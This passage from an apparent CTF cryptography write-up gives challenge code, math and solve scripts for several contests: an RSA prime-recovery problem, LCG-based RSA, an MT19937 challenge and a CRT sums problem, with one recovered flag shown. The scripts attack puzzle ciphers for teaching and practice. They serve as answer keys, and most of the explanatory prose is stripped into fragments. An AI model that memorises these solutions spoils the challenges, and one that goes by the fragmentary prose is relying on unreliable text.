style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><img src="https://pic1.zhimg.com/80/v2-e37944dd5555d6ecc347a59f817263ba_1440w.png" alt="" /><br /><strong></strong><strong>flag()</strong></p><p><strong></strong><code>flag</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo></mo><mi>s</mi><mi>u</mi><mi>m</mi><mi>s</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mo stretchy="false">(</mo><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag\equiv sums\ mod\ (b-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo></mo><mi>m</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>l</mi><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag\equiv m\ mod\ lcm(n,b-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>b<strong>mcrt</strong><strong>flag</strong><strong>flag</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>=</mo><mi>c</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mi>m</mi><mo separator="true">,</mo><mi>s</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><mi>l</mi><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag=crt([m,sums],[lcm(n,b-1),b-1])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>,<span class="number">256</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;basic-sums.chal-kalmarc.tf&#x27;</span>, <span class="number">2256</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Give me a base! &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;go! &#x27;</span>)</span><br><span class="line">    m0 = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    n0 = i-<span class="number">1</span></span><br><span class="line">    m = crt([m,m0],[n,n0])</span><br><span class="line">    n = lcm(n,n0)</span><br><span class="line">    p.close()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;kalmar&#123;At_least_it_wasnt_lattices_right???!?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-2f0a7e2ca653e85402ba8c351ccf9640_1440w.png" alt="" /><br /><strong></strong></p><p>()OvO</p><h1 id="tpctf2025-randomized-random"><a class="markdownIt-Anchor" href="#tpctf2025-randomized-random"></a> TPCTF2025 - randomized random()</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>)+flag[random.getrandbits(<span class="number">32</span>)%<span class="built_in">len</span>(flag)])</span><br><span class="line">    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p><code>getrandbits</code><code>MT19937</code>24wp2012</p><p><a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">MT19937</a></p><p></p><h1 id="2024-randomrsa"><a class="markdownIt-Anchor" href="#2024-randomrsa"></a> 2024 - RandomRSA()</h1><blockquote><p>Ahint</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, a, b</span>):</span><br><span class="line">        self.p = p</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.x = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.p, self.a, self.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = (self.a*self.x+self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">bits, k</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    a = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    b = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    l = LCG(p, a, b)</span><br><span class="line">    <span class="keyword">return</span> [gmpy2.next_prime(l.<span class="built_in">next</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = getPrimes(<span class="number">1024</span>, <span class="number">2</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n, c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 170302223332374952785269454020752010235000449292324018706323228421794605831609342383813680059406887437726391567716617403068082252456126724116360291722050578106527815908837796377811535800753042840119867579793401648981916062128752925574017615120362457848369672169913701701169754804744410516724429370808383640129</span></span><br><span class="line"><span class="string">a = 95647398016998994323232737206171888899957187357027939982909965407086383339418183844601496450055752805846840966207033179756334909869395071918100649183599056695688702272113280126999439574017728476367307673524762493771576155949866442317616306832252931038932232342396406623324967479959770751756551238647385191314</span></span><br><span class="line"><span class="string">b = 122891504335833588148026640678812283515533067572514249355105863367413556242876686249628488512479399795117688641973272470884323873621143234628351006002398994272892177228185516130875243250912554684234982558913267007466946601210297176541861279902930860851219732696973412096603548467720104727887907369470758901838</span></span><br><span class="line"><span class="string">n = 5593134172275186875590245131682192688778392004699750710462210806902340747682378400226605648011816039948262008066066650657006955703136928662067931212033472838067050429624395919771757949640517085036958623280188133965150285410609475158882527926240531113060812228408346482328419754802280082212250908375099979058307437751229421708615341486221424596128137575042934928922615832987202762651904056934292682021963290271144473446994958975487980146329697970484311863524622696562094720833240915154181032649358743041246023013296745195478603299127094103448698060367648192905729866897074234681844252549934531893172709301411995941527</span></span><br><span class="line"><span class="string">c = 2185680728108057860427602387168654320024588536620246138642042133525937248576850574716324994222027251548743663286125769988360677327713281974075574656905916643746842819251899233266706138267250441832133068661277187507427787343897863339824140927640373352305007520681800240743854093190786046280731148485148774188448658663250731076739737801267702682463265663725900621375689684459894544169879873344003810307496162858318574830487480360419897453892053456993436452783099460908947258094434884954726862549670168954554640433833484822078996925040310316609425805351183165668893199137911145057639657709936762866208635582348932189646</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo></mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">x\equiv ax+b\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>k</mi><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">p&#x27;\equiv(x+k1)\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mo stretchy="false">(</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo>+</mo><mi>k</mi><mn>2</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">q&#x27;\equiv(ax+b+k2)\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mclose">)</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><msup><mi>q</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><mi>n</mi><mo></mo><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>b</mi><mo>+</mo><mi>k</mi><mn>2</mn><mo>+</mo><mi>a</mi><mi>k</mi><mn>1</mn><mo stretchy="false">)</mo><mi>x</mi><mo>+</mo><mi>b</mi><mi>k</mi><mn>1</mn><mo>+</mo><mi>k</mi><mn>1</mn><mi>k</mi><mn>2</mn><mo></mo><mi>n</mi><mo></mo><mn>0</mn><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">p&#x27;*q&#x27;-n\equiv ax^{2}+(b+k2+ak1)x+bk1+k1k2-n\equiv0\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><code>abpn</code><code>k1k2</code><code>x</code></p><p></p><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h2><blockquote><p><a href="https://tover.xyz/p/2024-ccb-RandomRSA/">https://tover.xyz/p/2024-ccb-RandomRSA/</a><br /><a href="http://www.andynoel.xyz/?p=904">http://www.andynoel.xyz/?p=904</a><br /><a href="https://blog.csdn.net/Jayjay___/article/details/142059111">https://blog.csdn.net/Jayjay___/article/details/142059111</a></p></blockquote><h1 id="tgctf2025-ezrsa"><a class="markdownIt-Anchor" href="#tgctf2025-ezrsa"></a> TGCTF2025 - EZRSA</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag, get_random_emojiiiiii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genarate_emojiiiiii_prime</span>(<span class="params">nbits, base=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(base // <span class="number">32</span> * <span class="number">32</span>) <span class="keyword">if</span> base &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits // <span class="number">8</span> // <span class="number">4</span> - base // <span class="number">32</span>):</span><br><span class="line">            p = (p &lt;&lt; <span class="number">32</span>) + get_random_emojiiiiii()  <span class="comment"># </span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode(</span><br><span class="line">) + <span class="string">&quot;&quot;</span>.join([long_to_bytes(get_random_emojiiiiii()).decode() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]).encode())</span><br><span class="line">p = genarate_emojiiiiii_prime(<span class="number">512</span>, <span class="number">224</span>)</span><br><span class="line">q = genarate_emojiiiiii_prime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="string">&quot;&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(e.encode()), n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p0 =&quot;</span>, long_to_bytes(p % <span class="number">2</span> ** <span class="number">256</span>).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># p0 = </span></span><br><span class="line"><span class="comment"># n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line"><span class="comment"># c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br></pre></td></tr></table></figure><p><code>p</code><strong>2249emoji</strong><code>get_random_emojiiiiii()</code></p><p><strong>p</strong><strong>p</strong><strong>256</strong></p><p>(1024<strong>576</strong>512<strong>288</strong>256<strong></strong>d<strong>1/4</strong>)</p><p><code>p</code><strong>8</strong><strong></strong><a href="https://apps.timwhitlock.info/emoji/tables/unicode">emoji</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">p0 = bytes_to_long(<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0xf09f9880</span>,<span class="number">0xf09f998f</span>):</span><br><span class="line">    p00 = i*<span class="number">2</span>^<span class="number">256</span> + p0</span><br><span class="line">    f = x*<span 